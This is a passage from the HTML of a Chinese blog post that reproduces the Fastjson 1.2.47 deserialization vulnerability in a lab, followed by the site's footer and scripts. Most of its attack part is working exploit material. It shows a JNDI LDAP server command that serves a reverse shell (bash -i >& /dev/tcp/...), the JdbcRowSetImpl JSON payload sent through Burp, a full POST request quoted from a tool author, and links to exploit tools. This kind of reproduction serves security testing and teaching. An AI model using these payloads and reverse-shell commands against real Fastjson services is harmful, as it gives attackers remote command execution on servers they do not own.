+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wyzxxz/jndi_tool</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>2、反弹 shell 命令</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 详细命令</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer x.x.x.x 2121 &quot;bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/2333 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line"># 命令解释</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer 本机IP LDAP服务监听端口 &quot;bash=bash -i &gt;&amp;/dev/tcp/获取反弹shell的VPS_IP/获取shell监听端口 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/17.png" data-caption="image-20220831200418585"><img src="/../images/fastjson-1.2.47/17.png" alt="image-20220831200418585"></a></p>
+<p>3、Burp 放包执行命令</p>
+<div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://x.x.x.x:2121/Object&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/18.png" data-caption="image-20220831200818338"><img src="/../images/fastjson-1.2.47/18.png" alt="image-20220831200818338"></a></p>
+<p>4、成功获取反弹 shell</p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/19.png" data-caption="image-20220831201239796"><img src="/../images/fastjson-1.2.47/19.png" alt="image-20220831201239796"></a></p>
+<p>5、工具作者教程：</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ldap:</span><br><span class="line">1. 启动LDAP服务，后面写要执行的语句</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 &quot;curl dnslog.wyzxxz.cn&quot;</span><br><span class="line"></span><br><span class="line">2. 发送请求包</span><br><span class="line">POST /test HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) </span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xx.xx.xx.xx:80/Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. 查看日志是否执行成功</span><br><span class="line"></span><br><span class="line">4、注：使用常规反弹shell无法实现反弹，作者反馈反弹shell命令为：bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+
+
+
+<blockquote>
+<p>Burp 被动扫描插件</p>
+</blockquote>
+<p>1、下载地址</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pmiaowu/BurpFastJsonScan/releases/tag/BurpFastJsonScan-2.2.2</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>2、导入 Burp 后，遇到 json 语句会自动扫描，开启后关闭结果即可</p>
+<h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/hei-zi/p/13274272.html</span><br><span class="line">https://www.cnblogs.com/nul1/p/12747709.html</span><br><span class="line">http://arsenetang.com/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/</span><br><span class="line">https://github.com/safe6Sec/Fastjson</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="0x05-本文工具"><a href="#0x05-本文工具" class="headerlink" title="0x05 本文工具"></a>0x05 本文工具</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.zip</span><br><span class="line">https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz</span><br><span class="line">https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset 提取码: sven</span><br><span class="line">marshalsec-0.0.3-SNAPSHOT-all.jar</span><br><span class="line">https://github.com/wyzxxz/jndi_tool</span><br><span class="line">https://github.com/pmiaowu/BurpFastJsonScan/releases/tag/BurpFastJsonScan-2.2.2</span><br></pre></td></tr></table></figure></div>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ox01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">Ox01 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%85%B6%E5%AE%83%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">0x03 其它方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%9C%AC%E6%96%87%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">0x05 本文工具</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&text=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&is_video=false&description=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fastjson-1.2.47漏洞环境搭建及复现&body=Check out this article: http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&name=Fastjson-1.2.47漏洞环境搭建及复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&t=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
